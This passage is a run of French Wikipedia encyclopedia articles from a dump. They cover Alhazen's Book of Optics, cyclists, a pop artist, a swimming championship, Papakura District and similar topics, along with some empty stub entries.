Le terme "accouplement" peut désigner plus largement le rapport sexuel (rapport vaginal ou rapport anal), mais également l'émission simultanée de gamètes, ou encore la fusion de deux individus dans le cas d'organismes unicellulaires.
L'accouplement peut avoir lieu à la suite d'un rapprochement des deux individus par des phéromones et/ou par une parade nuptiale ou à la suite d'une sélection sexuelle.
L'accouplement aboutit généralement à une fécondation interne mais il peut y avoir aussi émission simultanée et rapprochée des gamètes, suivie d'une fécondation externe (amplexus chez les amphibiens).

</doc>
<doc id="3214762" url="https://fr.wikipedia.org/wiki?curid=3214762" title="Jimmy Douglass">
Jimmy Douglass

Jimmy Douglass est un ingénieur du son originaire des États-Unis et un producteur de musique, dont la carrière prolifique s'étend sur plus de 40 ans. Après avoir travaillé pour de nombreux artistes depuis les années 1970, il occupe le poste d'ingénieur principal pour le producteur de R'n'B et de Hip-hop nommé Timbaland depuis 1996.
Carrière.
Jimmy Douglass commence sa carrière en tant que duplicateur de bandes à temps partiel au début des années 1970 aux studios Atlantic de New York. À l'époque, il est encore au lycée et travaille en soirée. Il apprend à utiliser la console 16 pistes customisée et observe le travail des grands ingénieurs et producteurs Tom Dowd, Jerry Wexler, et Arif Mardin. Pour sa première intervention à la console de mixage, il est encouragé par Wexler pour superviser l'enregistrement d'une démo d'un nouveau groupe.
Douglass est bien connu pour sa technique non conformiste en studio, et pour avoir aidé les artistes à dépasser les limites de leur genre musical. Il est réputé pour apporter un côté brut au son, et plus précisément un lourd son de basse funk à la musique rock. Il fait une apparition aux anges de la Téléréalité 5 pour aider les chanteurs à concrétiser leur rêve.

</doc>
<doc id="3214764" url="https://fr.wikipedia.org/wiki?curid=3214764" title="Traité d'optique">
Traité d'optique

Le Traité d'optique (en arabe Kitab al-Manazir ou كِتَابُ المَنَاظِر, en latin ou ) est un ouvrage en sept volumes traitant de domaines scientifiques variés : l’optique, la physique, les mathématiques, la médecine, l’anatomie et la psychologie, écrit par le scientifique arabe Alhazen (nom latinisé d'Ibn al-Haytham) au début du . Le livre a eu une influence importante sur le développement de l'optique et de la science en général car il a profondément renouvelé la connaissance de la lumière et de la vision, et mis en œuvre de manière systématique une démarche d’enquête fondée sur l’observation, l’usage d’instruments et le raisonnement mathématique.
Cet ouvrage traite de l'optique géométrique et de l'optique physiologique. Alhazen y expose ses idées sur la nature de la lumière et des couleurs, étudie le trajet des rayons lumineux, les problèmes de réflexion et de réfraction. Il s'intéresse au mécanisme de la vision, avec un organe récepteur, l'œil, et une interprétation par le cerveau. Il donne ainsi des explications et des descriptions dans le domaine de la perception visuelle et des illusions d’optique. Alhazen accompagne assez systématiquement ses affirmations d'un recours à des expériences reproductibles et fait un usage très fréquent de la chambre noire qu'il a contribué à développer.
Connu dans le monde arabe par les commentaires qu'en font les successeurs d'Alhazen, tel Kamāl al-Dīn al-Fārisī, ce traité parvient en Europe à la fin du et va influencer pour plusieurs siècles de nombreux chercheurs tels Vitellion, Roger Bacon, John Peckham, Johannes Kepler et Willebrord Snell.
Vue d’ensemble.
Le traité d'optique n'est pas le premier ouvrage d'Alhazen concernant la vision mais c'est certainement le plus abouti. L'objectif d'Alhazen est de rédiger un traité sur la vision mais en faisant clairement, dès le départ, la distinction entre les conditions de la vision et les conditions de propagation de la lumière tout en procédant le plus souvent possible par observation et expérimentation.
Optique et vision.
Durant l’antiquité classique, deux grandes théories de la vision ont coexisté. La première théorie, la théorie de l’émission qui a été soutenue par des penseurs tels qu’Euclide et Ptolémée, postulait que la vision fonctionnait grâce à l’émission par l'œil d’un rayon de lumière. La deuxième théorie, la théorie de l'intromission, appuyée par Aristote et ses disciples, professait que les formes physiques entraient dans l'œil en provenance des objets. Chez les chercheurs arabes, la même scission apparait, al-Kindi et Hunayn ibn Ishaq se rapprochent de la théorie de l'émission, tandis que Rhazès et Avicenne réfutent par l'expérience et le raisonnement cette théorie. Alhazen se range nettement dans la seconde école, reprenant les réfutations de ses prédécesseurs. Il fait valoir, sur la base d'observations courantes et d'arguments logiques, que nous ne pouvons pas voir grâce à des rayons émis par l'œil. Mais il se détache de cette école sur un point fondamental : il ne croit pas que l'œil percevait le visible par le biais de formes physiques entrant dans l'œil. Pour lui, l'information ne réside pas dans une forme perçue comme une "totalité" mais comme une somme de rayons de lumière parvenant à l'œil à partir de chaque point d’un objet.
Il met en place une théorie de la lumière qui occupe plus de la moitié du traité. Pour lui, la lumière ("ḍawʾ") est indépendante de sa perception ("ibṣār"). Elle se propage en ligne droite avant et après réflexion ou réfraction, est dotée d'une vitesse très grande mais qui varie selon les milieux traversés et elle perd de son intensité en chemin. Elle irradie dans toutes les directions à sa source et ce même phénomène de dispersion radiale se produit en tout point d'un objet qu'elle éclaire (lumière seconde). C'est seulement sur les surfaces lisses que la lumière rebondit selon les lois de la réflexion et c'est la variation de vitesse de la lumière quand elle change de milieu qui explique le phénomène de réfraction. La couleur est une propriété intrinsèque de l'objet, activée au moment où celui-ci est éclairé et elle se déplace alors selon les mêmes règles que la lumière.
Alhazen décrit la vision comme faisant intervenir deux instances différentes. L'œil n'a qu'un rôle de récepteur de la lumière et de la couleur, et est traité comme un instrument optique dont il fait une anatomie complète descriptive et fonctionnelle. Il attribue au cristallin la capacité de renseigner sur l'intensité lumineuse et le voit comme une lentille réfringente bi-convexe. Il accepte l'opinion, généralement admise à son époque, que l'humeur cristalline est le siège principal de la sensation visuelle. L'unité de la vision binoculaire est assurée par un mouvement de convergence conjoint des deux yeux sur le point de fixation et la diplopie se produit lorsque cette fonction n'est pas assurée. Ibn al-Haytham fait une étude détaillée des conditions de fusion des images binoculaires au moyen d'une tablette expérimentale, qui sera reprise jusqu'à l'époque classique . L'œil perçoit donc la taille, la forme, la transparence (couleur et luminosité), la position et le mouvement mais la distinction cognitive se fait au niveau du cerveau. Pour Alhazen, la perception n'est pas seulement physique mais psychologique et tout acte de vision est accompagné d'une activité mentale de reconnaissance, comparaison, discernement, jugement et inférence.
Méthode scientifique.
L'un des aspects associés aux recherches en optique d’Ibn al-Haytham est un recours systématique à une méthodologie d'expérimentation ("i'tibar") et aux essais contrôlés dans ses investigations scientifiques. Selon A.I. Sabra, ce terme ("iʿtibār") traduit en latin par "experimentum" doit être plus vu comme "test d'hypothèse" que comme processus vers une découverte. Ses méthodes expérimentales reposent sur la combinaison de la physique classique ("ilm tabi'i") avec les mathématiques ("ta'alim", géométrie en particulier) posant les rudiments de ce qui pourrait être désigné comme un modèle hypothèse-déduction dans la recherche scientifique. Cette approche mathématique et physique de la science expérimentale a sous-tendu la plupart des propositions du "Kitab al Manazir" ("Traité d'optique", "De aspectibus" ou "Perspectivae") et a constitué le fondement de ses théories sur la vision, la lumière et la couleur, ainsi que ses recherches en catoptrique et dioptrique.
Il a décrit son approche expérimentale, fondée sur le doute ("shukūk"), dans l'introduction du livre comme suit :
De nombreux auteurs contemporains ont rapproché cette démarche d’une forme de méthode scientifique, en soulignant la présence, dans le "Kitāb al-Manāẓir", de séquences typiques d’observation des phénomènes, de formulation d’hypothèses, de mise à l’épreuve par des expériences instrumentées et d’analyse des résultats. Abdelhamid I. Sabra et Roshdi Rashed insistent cependant sur le fait que ces rapprochements sont rétrospectifs : le terme "iʿtibār" renvoie d’abord, pour Ibn al-Haytham, à l’idée de « mise à l’épreuve » d’énoncés géométrico-physiques, dans un cadre conceptuel où la physique naturelle ("ʿilm ṭabīʿī") et les sciences mathématiques ("taʿālīm") restent étroitement articulées.
Roshdi Rashed note ainsi que « par la promotion de l'utilisation d'expériences dans la recherche scientifique, al-Haytham a joué un rôle important dans le démarrage de la science moderne » et cet avis est partagé par Rosanna Gorini qui le considère comme un . Ces formules sont toutefois entendues, chez ces auteurs, comme des évaluations a posteriori de l’importance historique du "Traité d’optique" et non comme l’affirmation qu’Ibn al-Haytham aurait formulé lui-même une « méthode scientifique » proprement dite au sens moderne.
Plus largement, plusieurs synthèses consacrées à la pensée médiévale soulignent que la rationalité de cette époque se déploie dans un univers de culture écrite où la lecture, le commentaire, la dispute et la mise en forme de questions structurent la vie intellectuelle, plutôt que dans une séparation nette entre « science », « philosophie » et « théologie ». Dans ce cadre, les pratiques d’observation, d’argumentation et d’examen critique que l’on trouve chez Ibn al-Haytham peuvent être comprises comme une modalité particulière de ces techniques de lecture et d’enquête, plutôt que comme l’application anticipée d’un modèle moderne de « méthode scientifique ».
Volumes.
Livre I.
Dans le "Livre I", Ibn al-Haytham commence par une introduction sur les deux doctrines de la vision qui dominaient auparavant la pensée antique sur l'optique : l'émission et l'intromission. Il affirme que ses recherches et ses investigations sur la lumière seront basées sur l’expérimentation et les preuves plutôt que sur la théorie abstraite et il décrit l'approche systématique qu'il utilisera pour résoudre le problème de la vision dans ses études sur l'optique. Pour justifier son choix de la théorie de l’intromission, il décrit un certain nombre d'observations où les yeux éprouvent une douleur lorsqu'ils sont exposés à une lumière vive (lumière principale) et où les yeux perçoivent une image persistante après avoir fixé un objet illuminé (lumière secondaire) pendant une longue période de temps.
Il décrit ensuite les règles de déplacement de la lumière (en ligne droite, à vitesse variable, s'estompant avec la distance) et les conditions de la vision (l'objet doit être lumineux par lui-même ou éclairé, il doit faire face à l'œil, le milieu qui le sépare de l'œil doit être transparent et moins opaque que lui, l'objet doit avoir une taille suffisante...).
Il examine aussi la structure anatomique de l'œil. Selon Alhazen, l'œil est constitué de deux sphères. La plus grande est la sphère uvéale contenant le corps vitré, la plus petite est la sphère de la cornée. Les deux sphères s'intersectent selon une lentille bifocale qui donne le cristallin. Il place le nerf optique dans l'alignement des centres des deux sphères, au lieu de le déporter vers le nez. Tous ces éléments sont inclus dans des membranes (non représentées dans le schéma ci-contre) destinées à maintenir la cohésion de l'ensemble. On retrouve dans cette conception anatomique quelques éléments figurant déjà chez Galien. Quand il cherche à expliquer comment les rayons lumineux, en pénétrant dans l’œil, peuvent reconstituer l'image d'un objet, il se heurte à deux problèmes. Le premier est le diamètre de la pupille qui, trop important pour être considéré comme un trou d'aiguille, doit théoriquement reproduire une image floue. Ne voyant pas le cristallin comme une lentille capable d'effectuer une mise au point, il émet l'hypothèse que seuls les rayons traversant les surfaces de contact perpendiculairement sont conservés. Ce qui le conduit à utiliser une réfraction pour qu'un même rayon soit perpendiculaire à la cornée et au cristallin. Le second problème rencontré est que ce fonctionnement conduit à avoir une image inversée dans l’œil. Cette inversion parait inconcevable à Alhazen qui redresse l'image par une nouvelle réfraction (solution élégante mais fausse).
Livre II.
Le livre II décrit comment l’œil perçoit les différentes propriétés liées à la vision (lumière, couleur, distance, position, forme, taille, mouvement, transparence, beauté, laideur...).
Pour Alhazen, la vision se produit dans le cerveau, plutôt que dans les yeux. Il fait observer que l'expérience personnelle a un effet sur ce que les gens voient et comment ils le voient et que la vision et la perception sont subjectives. Il décrit, par exemple, comment un petit enfant avec moins d'expérience peut avoir davantage de difficultés à interpréter ce qu'il/elle voit, ou bien comment on est capable d'identifier un cercle même s'il est vu en perspective.
Livre III.
Le Livre III est consacré aux illusions d'optique dues à la psychologie de la perception visuelle. Il expose ainsi toutes les erreurs de vision directe dues à la sensation et à l'interprétation.
Il aborde aussi le problème de la vision binoculaire, énonçant une première version de ce qui deviendra la . Il se penche sur l'illusion lunaire pour l'expliquer par de mauvaises appréciations des distances et des référentiels plutôt que par la réfraction.
Livres IV–V.
Ces livres traitent de la réflexion. Alhazen donne des preuves expérimentales de la réflexion sur les surfaces lisses, et l'explique par le modèle mécanique d'une balle rebondissant sur un mur. Il présente une version aboutie de la loi de la réflexion et présente un instrument destiné à mesurer les réflexions sur des miroirs plans, cylindriques, sphériques, coniques, concaves ou convexes. Dans le livre V, il s'attache à la résolution de problèmes géométriques liés à la réflexion, en particulier le problème d'Alhazen qui consiste à déterminer en quel point d'un miroir sphérique se réfléchit un rayon lumineux partant de l'objet pour atteindre l'œil.
Livre VI.
Le livre VI est consacré à l'analyse des erreurs de vision et d'interprétation concernant les images réfléchies.
Livre VII.
Le livre VII examine la réfraction. Avec un instrument de mesure inspiré de celui de Ptolémée et amélioré par lui, il effectue une série de mesures. Mais au lieu de les reporter dans des tables, comme l'avait fait Ptolémée, il établit des lois liant angle d'incidence et déviation quand le rayon passe d'un milieu moins réfringent à un milieu plus réfringent : l'angle d'incidence et la déviation varient dans le même sens, mais la vitesse de variation est plus faible pour la déviation que pour l'incidence. Il ne poursuit cependant pas dans la voie initiée par Ibn Sahl et ne fait pas mention de la loi découverte par celui-ci. Il explique cette déviation par la variation de la vitesse de la lumière passant d'un milieu à l'autre. Il décompose cette vitesse en une composante parallèle au plan tangent et un composante normale à celui-ci. Seule la vitesse serait ralentie en passant d'un milieu à l'autre. On retrouve une décomposition analogue chez Witelo, Kepler puis dans "La Dioptrique" de Descartes.
Pour Alhazen, la réfraction est le principe fondamental du fonctionnement de l'œil, fonctionnement qu'il affine, remarquant qu'un objet, qui normalement, n'aurait pas du être perçu car situé en dehors du cône de vision, reste cependant visible. Cette observation le conduit à envisager une nouvelle réfraction dans le trajet de la lumière dans l'œil.
Puis le livre s'attache à l'image d'un objet par réfraction. Au cours de ces études, Alhazen met en évidence l'aberration sphérique. Son étude du dioptre sphérique, lui permet d'observer qu'il permet d'agrandir une image (effet de loupe) mais il ne fait pas mention d'un quelconque usage pour améliorer la vision.
Dans le domaine de l'astronomie, il revient sur le rôle de la réfraction dans l'illusion lunaire et conclut sur le rôle prépondérant de la psychologie dans l'interprétation des tailles. Il énonce que les cieux sont moins denses que l'air.
Expériences et instruments.
Règles et tubes.
Les règles et tubes sont les instruments les plus simples utilisés par Alhazen pour ses expérimentations. Ainsi, pour prouver que les rayons se déplacent en ligne droite, il dispose sur une règle droite un cylindre long et étroit ouvert aux deux extrémités. Plaçant son œil à une des extrémités, il ne voit de l'objet que les parties situées directement en face de l'ouverture du tube. Et s'il obture une partie de l'orifice, disparaît la partie de l'objet qui se trouve alignée avec l'œil et le cache.
Pour démontrer que la lumière irradie de tous les points de l'objet, il place le tube à travers une plaque de cuivre percée d'un trou. Il obture l'autre extrémité du tube ne laissant passer la lumière que par un petit trou. Il place alors le tube devant une lampe à huile, la lumière traversant le tube et passant par le trou dessine un point lumineux sur un écran. Si on déplace la lampe à huile, le spot lumineux persiste prouvant que tous les points de la lampe produisent de la lumière dans toutes les directions.
Chambre obscure.
Dans ses diverses expérimentations, Ibn al-Haytham a utilisé le terme "al-Bayt al-Muthlim" (en arabe: البيت المظلم) traduit par "chambre noire", ou décrit comme "chambre obscure". L'utilisation d'une "chambre à rayons", c'est-à-dire d'une pièce ne laissant pénétrer la lumière que par un petit trou est attestée avant Ibn al-Haytham. Des philosophes tels qu’Aristote, Théon d'Alexandrie et Al-Kindi (Alkindus) ont décrit les effets d'une lumière ponctuelle passant par un trou. L'objectif de telles chambres est d'observer les rayons lumineux et non de reproduire une image à l'aide d'un sténopé. Il n'existe d'ailleurs aucune expérience utilisant un sténopé dans le "Traité d'optique". Alhazen n'utilise sa chambre obscure que pour démontrer les propriétés des rayons lumineux.
Ainsi, pour démontrer que les rayons lumineux sont en ligne droite, il imagine une chambre obscure dont l'air est empli de fumée ou de poussière, la lumière passant par le trou dessine un rayon rectiligne. Si l'air de la chambre est pur, le rayon va éclairer le mur opposé de telle sorte que la tache lumineuse, le trou et la source de lumière soient alignés. Il l'utilise aussi pour montrer la différence entre les corps réfléchissant et ceux irradiant la lumière dans toutes les directions.
Pour démontrer qu'un corps irradie sa couleur quand il est éclairé, il place un tissu coloré dans la chambre obscure dont les murs sont blancs. Lorsque ce tissu coloré est éclairé par la lumière passant par le trou, tous les murs prennent la couleur du tissu.
L'expérience du "Traité d'optique" qui se rapproche le plus du sténopé est celle élaborée pour prouver que les rayons lumineux ne se mélangent pas. Alhazen dispose plusieurs lampes face au trou de la chambre obscure. Chaque lampe dessine un spot lumineux sur le mur d'en face. Si on obture une des lampes, le point lumineux correspondant disparait. Les rayons lumineux se croisent donc au point d'entrée de la chambre sans se mélanger. Pour beaucoup d'historiens, cette expérience est l'indice très fort qu'Alhazen avait compris le principe du sténopé car l'ordre des lampes est inversé à l'intérieur de la chambre. De plus, Alhazen insiste sur le fait qu'on peut utiliser un très petit trou.
Dans l"Épître sur la forme de l'éclipse" (en arabe : "Maqalah-fi-Surat al-Kosuf", مقالة في صورة الكسوف), Alhazen développe une étude mathématique et expérimentale complète de la chambre obscure considérée comme un sténopé, en étudiant les conditions de formation de l'image du croissant de soleil à l'intérieur de la chambre, principalement la taille, la forme de l'ouverture, la distance focale de la chambre, la forme et l'intensité de la source .
Postérité.
Dans le monde arabe.
Les éléments manquent pour évaluer correctement l'influence de son traité dans le monde arabe. Les traités d'optique postérieurs à celui d'Ibn al-Haytham qui sont parvenus aux historiens sont davantage destinés à l'enseignement et reprennent plutôt les idées classiques grecques. La reprise la plus fondamentale est la «réforme» de son "Traité d’optique" par Kamāl al-Dīn al-Fārisī († ca. 1320) dans son "Tanqih Kitab al-Manazir" ("La révision du "Traité d’optique" d’Ibn al-Haytham") entreprise sur les conseils d'al-Shirāzī qui aurait eu connaissance du traité sans avoir encore eu l'occasion de le lire.
Traductions en latin.
Le "Traité d’Optique" a été traduit en latin par un savant inconnu à la fin du ou du début du . Il a été imprimé par Friedrich Risner en 1572, sous le titre d’"Opticae thesaurus : Alhazeni Arabis libri septem, nuncprimum editi ; Eiusdem liber De Crepusculis et Nubium ascensionibus" . Risner est également l'auteur de la variante de nom "Alhazen" qui était connu auparavant en Occident sous le nom d’Alhacen, qui est une transcription plus correcte du nom arabe.
Réception en Europe.
L'ouvrage latin arrive en Europe dans une période d'intenses traductions d'ouvrages concernant l'optique grecque ou arabe (). Il est mentionné, dès 1220-1230, dans une encyclopédie "De proprietatibus rerum". Dans son ouvrage de 1250-1260 "De multiplicatione specierum", Roger Bacon fait de très larges emprunts à l'optique géométrique du traité d'Alhazen. Il en est de même, à la fin du , de Vitellion dans son "De Perspectiva" et de John Peckham dans son manuel de vulgarisation "Perspectiva Communis".
Le nom d'Alhacen et ses contributions en optique deviennent rapidement populaires, bien au delà de la sphère scientifique. Il est fait allusion à lui et ses œuvres dans l'ouvrage poétique médiévale "Le Roman de la Rose" () et dans "Les Contes de Canterbury" de Geoffrey Chaucer (). Dans le domaine de la religion, John Wyclif, le théologien inspirateur de la Réforme protestante, se réfère à Alhazen dans une discussion sur les sept péchés capitaux en termes de déformation des sept types de miroirs décrits dans "De aspectibus". Quant à son influence dans l'introduction de la perspective chez les peintres de la renaissance italienne, le sujet reste débattu.
Dans le domaine scientifique, l'œuvre d'Alhazen, par l'entremise de Roger Bacon, joue un rôle majeur dans la refondation des connaissances en optique et en perception visuelle. Plusieurs auteurs modernes voient dans le "Traité d’optique" l’une des sources de l’optique dite « moderne » et présentent Ibn al-Haytham comme un pionnier de la méthode scientifique. Il est également tenu pour l’un des inspirateurs de nombreuses technologies optiques plus tardives concernant les lentilles. Son traité sert encore de base de recherche au chez Kepler et Snell.
Traités connexes.
En revanche, le traité "Sur le Crépuscule et l'Aube" dans lequel il est établi que l'aube et le crépuscule correspondent à un passage du soleil à 19° sous l'horizon et où est fixé l'épaisseur de l'atmosphère terrestre à , attribué jusqu'en 1967 à Alhazen, est en réalité l'œuvre d'un mathématicien andalous du , Abū ʿAbd Allāh Muḥammad Ibn Muʿādh.

</doc>
<doc id="3214765" url="https://fr.wikipedia.org/wiki?curid=3214765" title="Guillaume Bonnafond">
Guillaume Bonnafond

Guillaume Bonnafond , né le à Valence, est un coureur cycliste français. Il est professionnel entre 2008 et 2018.
Biographie.
Débuts cyclistes et carrière chez les amateurs.
Guillaume Bonnafond commence le cyclisme à 13 ans. Il pratique également le basket-ball jusqu'à 16 ans. Il passe dans différents clubs cyclistes (Crest Saillans, Le Cheylard CF 07, Charvieu-Chavagneux Isère), puis intègre le Chambéry CF, lié à l'équipe professionnelle AG2R La Mondiale. En 2008, il remporte notamment la Ronde de l'Isard d'Ariège et le Tour des Pays de Savoie, et se classe deuxième du championnat de France amateur. Il est engagé comme stagiaire par AG2R La Mondiale, avec laquelle il participe à la Polynormande et à Paris-Corrèze. Il devient professionnel dans cette équipe en 2009.
Carrière professionnelle.
2009-2016 : AG2R La Mondiale.
À la suite du désistement de Ludovic Turpin, il est engagé sur le Tour d'Italie 2009 durant lequel il s'illustre en étant échappé à trois reprises (, et étapes). Il termine de la étape, jugée au sommet du San Luca de Bologne, et du classement général. En fin de saison, il s'avère être un coéquipier utile pour Romain Sicard qui remporte le Tour de l'Avenir.
En 2010, il est de nouveau aligné sur le Tour d'Italie mais est contraint à l'abandon à la suite d'une chute lors de la sixième étape. Il est engagé pour la première fois sur le Tour d'Espagne lors de cette même année. Il y est actif (échappé lors de la quatrième étape) et termine au classement général. En fin de saison, il termine le Tour de Lombardie à la place. Il ne parvient pas à obtenir de place dans les dix premiers d'un classement général.
Il entame en 2011 sa troisième année avec l'équipe Ag2r La Mondiale. Sur le Tour d'Espagne, il signe sa meilleure performance sur un grand tour (), ce qui constitue l'unique fait remarquable de cette année discrète. 
La saison 2012 s'avère être un meilleur cru pour Bonnafond qui participe pour la troisième fois de sa carrière au Tour d'Italie. En l'espace d'une semaine lors du mois d'août, il finit deuxième de Paris-Corrèze et septième du Tour de l'Ain après avoir décroché des places d'honneur sur les étapes reines.
2017-2018 : Cofidis.
En août 2016, il signe un contrat avec l'équipe continentale professionnelle française Cofidis.
Il met un terme à sa carrière à l'issue de la saison 2018.
Reconversion professionnelle.
À l’issue de sa carrière professionnelle, il devient directeur de la performance au sein de la formation Swiss Racing Academy jusqu’en décembre 2022. 
En 2023, il est recruté par la formation DSM en qualité d’entraîneur.
Palmarès et classements mondiaux.
Résultats sur les grands tours.
Tour d'Italie.
5 participations
Tour d'Espagne.
3 participations
Classements mondiaux.
Légende : nc = non classé

</doc>
<doc id="3214771" url="https://fr.wikipedia.org/wiki?curid=3214771" title="Bateau-omnibus">
Bateau-omnibus



</doc>
<doc id="3214773" url="https://fr.wikipedia.org/wiki?curid=3214773" title="Navette fluviale">
Navette fluviale



</doc>
<doc id="3214774" url="https://fr.wikipedia.org/wiki?curid=3214774" title="James Rizzi">
James Rizzi

James Rizzi ( à Brooklyn, New York - à Manhattan, New York) est un artiste peintre de pop art américain. Jusqu'à sa mort, il résida et travailla dans un atelier-loft à SoHo, au sud de Manhattan.
Biographie.
James Rizzi est né à Brooklyn, New York le . Il étudie les beaux-arts à l'Université de Floride à Gainesville (Floride) où il se destine à l'étude de la peinture, des techniques de gravure et de sculpture, tout en développant des techniques de graphisme en 3D qu'il utilise fréquemment. À l'issue de ses études, en 1974, il présente pour la première fois ses travaux au public au "Brooklyn Museum" à New York.
Sa popularité augmentant, des galeries et des musées s'intéressent de plus en plus à son travail. James Rizzi diversifie alors ses activités, il participe à la création de visuels de pochettes de CD ou encore au design d'objets courants, comme des cartes téléphoniques.
James Rizzi est couronné de nombreuses distinctions, faisant de lui un artiste peintre du pop art populaire.
James Rizzi s'engage par ailleurs à plusieurs reprises auprès d'associations de bienfaisance.
Style.
James Rizzi est surtout renommé pour ses œuvres en 3D, en particulier pour ses créations larges et élaborées représentant des paysages urbains. Ses travaux ont souvent pour objet sa ville natale, New York, et ses habitants. Ses créations sont pour la plupart de style naïf, dans des tons très colorés.

</doc>
<doc id="3214775" url="https://fr.wikipedia.org/wiki?curid=3214775" title="Graham Baker">
Graham Baker



</doc>
<doc id="3214778" url="https://fr.wikipedia.org/wiki?curid=3214778" title="Bateau bus">
Bateau bus



</doc>
<doc id="3214781" url="https://fr.wikipedia.org/wiki?curid=3214781" title="Charles Graham Baker">
Charles Graham Baker

Charles Graham Baker, né le à Evansville, dans le comté de Vanderburgh, dans l'Indiana, et mort le à Reseda, dans la vallée de San Fernando, à Los Angeles, est un scénariste américain. Il écrivit plus de 170 films entre 1915 et 1948.
Biographie.
Charles Graham Baker a inventé le jeu Gin rami avec son père en 1909 

</doc>
<doc id="3214783" url="https://fr.wikipedia.org/wiki?curid=3214783" title="Graminicole rayé">
Graminicole rayé



</doc>
<doc id="3214791" url="https://fr.wikipedia.org/wiki?curid=3214791" title="Championnats d'Europe de natation en petit bassin 1999">
Championnats d'Europe de natation en petit bassin 1999

Les Championnats d'Europe de natation en petit bassin, organisés par la LEN, se sont tenus à Lisbonne (Portugal) du 9 au 12 décembre 1999.
Le Complexo Desportivo do Jamor est le cadre des 38 épreuves de ces championnats.
La Suède arrive en tête du classement des pays médaillés avec 10 titres et ses représentantes se sont distinguées en battant les 5 records mondiaux de ces championnats. L'Allemagne, seconde du classement, obtient le plus grand nombre de médailles (26 au total) mais seulement 5 titres, tout comme l'Ukraine, classée à la .

</doc>
<doc id="3214799" url="https://fr.wikipedia.org/wiki?curid=3214799" title="Menden (homonymie)">
Menden (homonymie)

Menden est le nom de places en Allemagne, dans le Land de Rhénanie-du-Nord-Westphalie:
Menden le nom de famille de

</doc>
<doc id="3214802" url="https://fr.wikipedia.org/wiki?curid=3214802" title="Carabine FM">
Carabine FM

Carabine FM est une émission humoristique de variétés de la Télévision suisse romande, diffusée entre 1986 et 1998.
Basée sur une émission de radio du même nom diffusée sur Couleur 3, elle était également présentée par Lolita, Gérard Mermet et Alain Monney. Un artiste était invité lors de chaque émission et avait l'occasion d'interpréter plusieurs titres de son répertoire, parmi lesquels Alain Chamfort, Étienne Daho, Catherine Lara, Hubert-Félix Thiéfaine, Gloria Lasso, Nits, Les Rita Mitsouko, Éric Morena, Alain Souchon, Laurent Voulzy ou The Young Gods.

</doc>
<doc id="3214806" url="https://fr.wikipedia.org/wiki?curid=3214806" title="Montagsdemonstrationen">
Montagsdemonstrationen



</doc>
<doc id="3214807" url="https://fr.wikipedia.org/wiki?curid=3214807" title="Compagnie des Batobus">
Compagnie des Batobus



</doc>
<doc id="3214809" url="https://fr.wikipedia.org/wiki?curid=3214809" title="Guillaume Le Floch">
Guillaume Le Floch

Guillaume Le Floch est un coureur cycliste français professionnel, né le à Saint-Brieuc. Professionnel de 2007 à 2011, il a aussi été membre de l'équipe amateur Côtes d'Armor-Marie Morin en 2012.
Biographie.
Vice-champion de France sur route espoirs en 2006, Guillaume Le Floch devient professionnel en 2007 dans l'équipe Bretagne Armor Lux. En 2009, il est recruté par l'équipe BBox Bouygues Telecom. Il participe avec elle au Tour d'Italie en 2009 et 2010. Non-conservé à l'issue de la saison 2011, il rejoint en 2012 l'équipe amateur française Côtes d'Armor-Marie Morin, qui évolue en Division nationale 2.
Résultats sur les grands tours.
Tour d'Italie.
2 participations

</doc>
<doc id="3214825" url="https://fr.wikipedia.org/wiki?curid=3214825" title="District de Papakura">
District de Papakura

Le district de Papakura ("") était, de 1989 à 2010, l'un des districts de la ville d'Auckland, dans l'île du Nord de la Nouvelle-Zélande. C'est la partie la plus au sud de la région métropolitaine d'Auckland, et fait partie des régions d'habitude appelées "South Auckland" (quartiers Sud d'Auckland).
À l'origine une petite ville indépendante, celle-ci devient le district de Papakura à la suite de la réorganisation, en 1989, des gouvernements locaux en Nouvelle-Zélande. Il fait aujourd'hui partie de la zone urbaine d'Auckland.
Géographie.
Papakura s'étend sur 123 km et se situe à 32 km au sud du centre-ville d'Auckland. Le district est bordé des plages de la baie de Manukau à l'ouest, Manukau City au nord, et de terres rurales à l'est et au sud, avec Drury comme établissement le plus proche. À l'est on trouve les premières collines menant aux .
Papakura est un des deux conseils-local (local board) du district de Manurewa - Papakura. Ce district est donc divisé en deux parties : Manurewa et Papakura.
Histoire.
Le nom de Papakura vient du maori : "« papa »" signifie « terre » ou « plat » et est une abréviation de Papatuanuku ; "« kura »" signifie « rouge ». Le nom reflète donc les terres rouges, riches et fertiles, sur laquelle est située Papakura.
Les Maoris habitant la région bâtirent une pa appelée "Puke-Kiwi-Riki" au sommet de la colline de Red Hill, surplombant la baie de Manukau et le pays aux alentours.
Une ancienne grande route, la "", passe par Papakura et forme aujourd'hui sa rue principale. Elle fut construite pendant les guerres néo-zélandaises pour transporter des vivres aux troupes pendant la . Elle fut protégée par des constables armés et désignée route militaire.
En 2004 son palais de justice a servi de cour suprême pour les îles Pitcairn.
Démographie.
La population totale du district (côté Papakura) a été estimé à habitants lors du recensement de 2006, dont dans la ville de Papakura, à Takanini et à Drury.
Sa population est estimée d'être en croissance trois fois plus rapide que le reste de la Nouvelle-Zélande. Ses habitants sont majoritairement d'origine européenne (un peu moins de 75 %), et 20 % sont d'origine maori. Le conseil communal d'Auckland estime que la population va y tripler d'ici cinquante ans.
Infrastructure.
La "State Highway 1" et la ligne ferroviaire "North Island Main Trunk" passent par le district. Il abrite également l', le plus actif de Nouvelle-Zélande en nombre d'atterrissages/décollages.

</doc>
<doc id="3214826" url="https://fr.wikipedia.org/wiki?curid=3214826" title="Wesley Person">
Wesley Person

Wesley Lavon Person, né le à Brantley dans l'Alabama, est un ancien joueur américain de basket-ball de NBA. Il est le frère cadet de l'ancien joueur NBA Chuck Person.
Biographie.
Sélectionné par les Suns de Phoenix au de la draft 1994 à sa sortie de l'université Auburn, il joua trois saisons pour les Suns, cinq pour les Cavaliers de Cleveland, 82 matchs en deux saisons avec les Grizzlies de Memphis, 33 matchs pour les Trailblazers de Portland, neuf matchs pour les Hawks d'Atlanta, seize pour le Heat de Miami et 25 pour les Nuggets de Denver.
Sa meilleure saison eut lieu en 1997-1998 avec les Cavaliers de Cleveland, avec des moyennes de 14,7 points, 4,4 rebonds, 2.3 passes décisives et 1,57 interception par match. Il était réputé pour ses capacités au tir à trois-points, étant par ailleurs le joueur ayant le plus tenté et réussi de tirs à trois-points en 1997-1998. Il aura réussi un pourcentage de 41,8 % en carrière.

</doc>
<doc id="3214828" url="https://fr.wikipedia.org/wiki?curid=3214828" title="Faut-il">
Faut-il



</doc>
<doc id="3214833" url="https://fr.wikipedia.org/wiki?curid=3214833" title="Papakura District">
Papakura District



</doc>
